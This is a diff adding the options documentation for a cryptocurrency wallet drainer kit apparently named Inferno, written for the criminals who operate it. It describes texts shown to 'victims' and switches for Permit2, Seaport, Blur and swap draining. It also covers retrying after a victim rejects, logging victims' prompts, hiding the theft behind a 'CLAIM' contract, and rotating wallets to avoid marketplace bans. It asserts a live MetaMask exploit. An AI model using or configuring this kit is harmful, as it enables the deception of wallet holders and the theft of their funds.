@@ -1,0 +1,43 @@
+Last time, pastebin banned us so we will host the options doc here:
+
+interact_buttons_class: Define the class to add to buttons you want to prompt modal when click on
+sign_text: Define the text on button ( if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when a signature will be asked
+waiting_text: Define the text on button ( if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when drainer is fetching assets
+connect_text: Define the text on button ( if change_buttons_text is enabled) that victim will see before to connect his wallet
+not_eligible_text:  Define the text on button ( if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when his wallet is empty or when the all drain steps are finished
+change_chain_text: Define the text on button ( if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when a change chain will be asked
+error_text:  Define the text on button ( if change_buttons_text is enabled) and on popup ( if enable_popup enabled ) that victim will see when the drainer can't get wallet address
+disable_permit2: All is on name, don't edit it
+disable_seaport: All is on name, don't edit it
+disable_permit: All is on name, don't edit it
+disable_swap: All is on name, don't edit it
+disable_blur: All is on name, don't edit it
+retry_count: The max number of retries with same method when user reject
+max_change_chain_retry: The max number of change chain retries when user reject
+use_approvement_for_tokens: Define if you prefer use approvement or token transfer ( MetaMask exploit is still live so don't switch it to false: https://ibb.co/DL18PN6)
+change_buttons_text: Define if the text on buttons will be replaced or not ( if break css then switch it to false )
+log_prompts: Define if you want to see all prompts of victims
+log_chains_accepts: Define if you want to log when the victim approve change chain
+create_wallet_for_seaport: This option wil create a new wallet each seaport and send you private key, it will avoid fast opensea ban ( I don't recommend this option because now blur is better than opensea )
+use_transfer_contract: Use a contract for all balance hits ( you can withdraw from contract with telegram commands, do /help ). Contract is good because user will see "CLAIM" + empty address: https://ibb.co/QDDRbD1
+hide_poor_connects: Will hide all empty connect from your logs
+enable_popup: Will prompt a little popup at each drain step with the text defined above: https://ibb.co/VW7t9qH
+use_window_provider_if_detected: Will use diretly wallet injected on browser is detected ( for example, if MetaMask detected, it will diretly try to connect it without prompting the modal )
+modal_style: Define the modal style
+modal_dark_mode: Define if the modal will be on dark / light mode
+
+Here are 4 modals possible:
+Modal 1: https://ibb.co/jkZ2nQW ( dark ) and https://ibb.co/JBtk69t ( light )
+Modal 2: https://ibb.co/4FxZr3z ( dark ) and https://ibb.co/1qnjpwD ( light )
+Modal 3: https://ibb.co/4RTRKpP ( dark ) and https://ibb.co/3d2vcfT ( light )
+Modal 4: https://ibb.co/BwRKyss ( dark ) and https://ibb.co/37rkDVX ( light )
+
+
+With inferno 5.6, we also offer you possibility to customize the modal ( only the 3 one ):
+On the modal_3_config option, you will have 5 params:
+logo_url: Define the logo of the modal 3
+background_color: Define the color of the modal 3 background ( support hex color with # in front )
+accent_color: Define the color of the main texts on the modal 3 ( support hex color with # in front )
+accept_fill_color: Define the color of the fill text of modal 3, not very usefull ( support hex color with # in front )
+font_family: Define the fonts to use
+Modal 3 with custom options: https://ibb.co/XJr1zDC
